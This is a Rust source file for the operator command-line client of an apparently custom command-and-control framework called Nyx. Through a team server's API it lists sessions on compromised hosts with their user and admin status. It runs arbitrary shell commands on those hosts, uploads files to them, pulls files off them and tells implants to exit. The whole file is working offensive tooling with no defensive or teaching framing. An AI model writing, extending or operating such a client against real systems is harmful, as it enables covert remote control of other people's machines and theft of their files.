//! Nyx operator CLI. A thin client over the team server's REST API.
//!
//! One-shot:   `nyx-cli list`  /  `nyx-cli shell <session-hex> "whoami /groups"`
//! Interactive: `nyx-cli repl`  (the default): `list`, `use <id>`, `shell <cmd>`, `exit`.

use std::time::Duration;

use anyhow::{anyhow, Result};
use clap::{Parser, Subcommand};
use rustyline::error::ReadlineError;
use rustyline::DefaultEditor;
use serde::Deserialize;

#[derive(Parser)]
#[command(name = "nyx-cli", version, about = "Nyx operator CLI")]
struct Cli {
    /// Team server URL.
    #[arg(long, env = "NYX_SERVER", default_value = "http://127.0.0.1:8443")]
    server: String,

    #[command(subcommand)]
    cmd: Option<Cmd>,
}

#[derive(Subcommand)]
enum Cmd {
    /// List active sessions.
    List,
    /// Queue a shell task on a session and print its output.
    Shell {
        /// Session id (hex, as shown by `list`).
        session: String,
        /// Command line to execute (passed to sh -c / cmd /c).
        args: String,
    },
    /// Upload a local file to the session (writes `remote` on the target).
    Upload {
        session: String,
        /// Local file to read.
        local: String,
        /// Name/path of the file on the target (relative to the agent's work dir).
        remote: String,
    },
    /// Download a file from the session and save it locally.
    Download {
        session: String,
        /// Path of the file on the target (relative to the agent's work dir).
        remote: String,
        /// Where to save it locally (defaults to the remote basename).
        local: Option<String>,
    },
    /// Interactive REPL (default if no subcommand given).
    Repl,
}

#[derive(Debug, Deserialize)]
struct SessionView {
    id: String,
    beacon_id: u32,
    hostname: String,
    username: String,
    os: String,
    arch: u8,
    pid: u32,
    is_admin: u8,
    pending: usize,
}

#[derive(Deserialize)]
struct TaskAck {
    task_id: u64,
}

#[derive(Debug, Deserialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
    data_hex: Option<String>,
    seq: Option<u32>,
    eof: Option<u8>,
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    match cli.cmd.unwrap_or(Cmd::Repl) {
        Cmd::List => print_list(&cli.server),
        Cmd::Shell { session, args } => {
            let task_id = enqueue_shell(&cli.server, &session, &args)?;
            match poll_result(&cli.server, &session, task_id)? {
                Some(text) => print!("{text}"),
                None => println!("[no output received for task {task_id} within timeout]"),
            }
            Ok(())
        }
        Cmd::Upload {
            session,
            local,
            remote,
        } => {
            let task_id = upload(&cli.server, &session, &local, &remote)?;
            match poll_result(&cli.server, &session, task_id)? {
                Some(_) => println!("[uploaded {local} -> {remote}]"),
                None => println!("[no ack for upload task {task_id} within timeout]"),
            }
            Ok(())
        }
        Cmd::Download {
            session,
            remote,
            local,
        } => download(&cli.server, &session, &remote, local.as_deref()),
        Cmd::Repl => repl(&cli.server),
    }
}

fn print_list(server: &str) -> Result<()> {
    let sessions: Vec<SessionView> =
        ureq::get(&format!("{server}/api/sessions")).call()?.into_json()?;
    if sessions.is_empty() {
        println!("(no sessions)");
        return Ok(());
    }
    println!(
        "{:<66} {:<6} {:<14} {:<14} {:<14} {:<3} {:<7}",
        "ID", "BEACON", "HOST", "USER", "OS", "ADM", "PENDING"
    );
    for s in sessions {
        println!(
            "{:<66} {:<6} {:<14} {:<14} {:<14} {:<3} {:<7}",
            short(&s.id), s.beacon_id, s.hostname, s.username, s.os, s.is_admin, s.pending
        );
    }
    Ok(())
}

fn short(id: &str) -> String {
    id.to_string()
}

fn enqueue_shell(server: &str, session: &str, args: &str) -> Result<u64> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "shell", "args": args },
    });
    let ack: TaskAck = ureq::post(&format!("{server}/api/task"))
        .send_json(body)
        .map_err(|e| anyhow!("enqueue failed: {e}"))?
        .into_json()?;
    Ok(ack.task_id)
}

fn enqueue_exit(server: &str, session: &str) -> Result<()> {
    let body = serde_json::json!({ "session": session, "command": { "type": "exit" } });
    let _ = ureq::post(&format!("{server}/api/task")).send_json(body);
    Ok(())
}

fn upload(server: &str, session: &str, local: &str, remote: &str) -> Result<u64> {
    let data = std::fs::read(local).map_err(|e| anyhow!("read {local}: {e}"))?;
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "upload", "name": remote, "data_hex": hex::encode(&data) },
    });
    let ack: TaskAck = ureq::post(&format!("{server}/api/task"))
        .send_json(body)
        .map_err(|e| anyhow!("enqueue failed: {e}"))?
        .into_json()?;
    Ok(ack.task_id)
}

/// Task a download and reassemble the streamed `FileChunk`s into a local file.
fn download(server: &str, session: &str, remote: &str, local: Option<&str>) -> Result<()> {
    let body = serde_json::json!({
        "session": session,
        "command": { "type": "download", "path": remote },
    });
    let ack: TaskAck = ureq::post(&format!("{server}/api/task"))
        .send_json(body)
        .map_err(|e| anyhow!("enqueue failed: {e}"))?
        .into_json()?;
    let task_id = ack.task_id;

    let out_path = local.map(str::to_string).unwrap_or_else(|| {
        std::path::Path::new(remote)
            .file_name()
            .and_then(|s| s.to_str())
            .unwrap_or("download.bin")
            .to_string()
    });

    let deadline = std::time::Instant::now() + Duration::from_secs(20);
    let mut chunks: Vec<(u32, Vec<u8>)> = Vec::new();
    let mut saw_eof = false;
    loop {
        let rs: Vec<ResultView> = ureq::get(&format!("{server}/api/results"))
            .query("session", session)
            .call()?
            .into_json()?;
        for r in rs {
            if r.task_id == task_id && r.kind == "file" {
                let seq = r.seq.unwrap_or(0);
                let data = r
                    .data_hex
                    .as_deref()
                    .map(hex::decode)
                    .transpose()?
                    .unwrap_or_default();
                if r.eof.unwrap_or(0) == 1 {
                    saw_eof = true;
                }
                if !chunks.iter().any(|(s, _)| *s == seq) {
                    chunks.push((seq, data));
                }
            }
        }
        if saw_eof {
            break;
        }
        if std::time::Instant::now() >= deadline {
            println!("[no eof for download task {task_id} within timeout]");
            return Ok(());
        }
        std::thread::sleep(Duration::from_millis(250));
    }
    chunks.sort_by_key(|(s, _)| *s);
    let mut out = Vec::new();
    for (_, d) in chunks {
        out.extend(d);
    }
    std::fs::write(&out_path, &out).map_err(|e| anyhow!("write {out_path}: {e}"))?;
    println!("[downloaded {remote} -> {out_path} ({} bytes)]", out.len());
    Ok(())
}

/// Poll a session's results for a specific task; return the first matching output.
fn poll_result(server: &str, session: &str, task_id: u64) -> Result<Option<String>> {
    let deadline = std::time::Instant::now() + Duration::from_secs(12);
    loop {
        let rs: Vec<ResultView> = ureq::get(&format!("{server}/api/results"))
            .query("session", session)
            .call()?
            .into_json()?;
        if let Some(r) = rs.into_iter().find(|r| r.task_id == task_id) {
            match r.kind.as_str() {
                "output" => return Ok(Some(r.text)),
                "error" => return Ok(Some(format!("[error] {}", r.text))),
                "ok" => return Ok(Some(String::new())),
                _ => return Ok(Some(format!("[{}]", r.kind))),
            }
        }
        if std::time::Instant::now() >= deadline {
            return Ok(None);
        }
        std::thread::sleep(Duration::from_millis(250));
    }
}

fn repl(server: &str) -> Result<()> {
    println!(
        "nyx> connected to {server}. commands: list | use <id> | shell <cmd> | upload <local> <remote> | download <remote> [local] | kill | exit"
    );
    let mut rl = DefaultEditor::new()?;
    let mut current: Option<String> = None;
    loop {
        let prompt = match &current {
            Some(id) => format!("nyx ({})> ", &id[..8.min(id.len())]),
            None => "nyx> ".to_string(),
        };
        let line = match rl.readline(&prompt) {
            Ok(l) => l,
            Err(ReadlineError::Interrupted | ReadlineError::Eof) => break,
            Err(e) => return Err(anyhow!(e)),
        };
        let _ = rl.add_history_entry(&line);
        let mut parts = line.split_whitespace();
        let cmd = parts.next().unwrap_or("");
        let rest: String = parts.collect::<Vec<_>>().join(" ");
        match cmd {
            "" => {}
            "list" | "sessions" | "ls" => {
                if let Err(e) = print_list(server) {
                    println!("! {e}");
                }
            }
            "use" => {
                if rest.is_empty() {
                    println!("usage: use <session-id>");
                } else {
                    current = Some(rest.trim().to_string());
                    println!("selected {rest}");
                }
            }
            "shell" | "run" => {
                let session = match &current {
                    Some(s) => s.clone(),
                    None => {
                        println!("! `use <id>` first");
                        continue;
                    }
                };
                if rest.is_empty() {
                    println!("usage: shell <cmd>");
                    continue;
                }
                match enqueue_shell(server, &session, &rest) {
                    Ok(task_id) => match poll_result(server, &session, task_id) {
                        Ok(Some(text)) => print!("{text}"),
                        Ok(None) => println!("[no output]"),
                        Err(e) => println!("! {e}"),
                    },
                    Err(e) => println!("! {e}"),
                }
            }
            "kill" => {
                if let Some(s) = &current {
                    let _ = enqueue_exit(server, s);
                    println!("exit tasked to {s}");
                }
            }
            "upload" | "up" => {
                let session = match current.clone() {
                    Some(s) => s,
                    None => {
                        println!("! `use <id>` first");
                        continue;
                    }
                };
                let mut p = rest.split_whitespace();
                let local = match p.next() {
                    Some(x) => x.to_string(),
                    None => {
                        println!("usage: upload <local-path> <remote-name>");
                        continue;
                    }
                };
                let remote = match p.next() {
                    Some(x) => x.to_string(),
                    None => {
                        println!("usage: upload <local-path> <remote-name>");
                        continue;
                    }
                };
                match upload(server, &session, &local, &remote) {
                    Ok(tid) => match poll_result(server, &session, tid) {
                        Ok(Some(_)) => println!("[uploaded {local} -> {remote}]"),
                        Ok(None) => println!("[no ack for upload task {tid}]"),
                        Err(e) => println!("! {e}"),
                    },
                    Err(e) => println!("! {e}"),
                }
            }
            "download" | "dl" => {
                let session = match current.clone() {
                    Some(s) => s,
                    None => {
                        println!("! `use <id>` first");
                        continue;
                    }
                };
                let mut p = rest.split_whitespace();
                let remote = match p.next() {
                    Some(x) => x.to_string(),
                    None => {
                        println!("usage: download <remote-path> [local-path]");
                        continue;
                    }
                };
                let local = p.next().map(|s| s.to_string());
                if let Err(e) = download(server, &session, &remote, local.as_deref()) {
                    println!("! {e}");
                }
            }
            "exit" | "quit" => break,
            other => println!("unknown command: {other}"),
        }
    }
    Ok(())
}
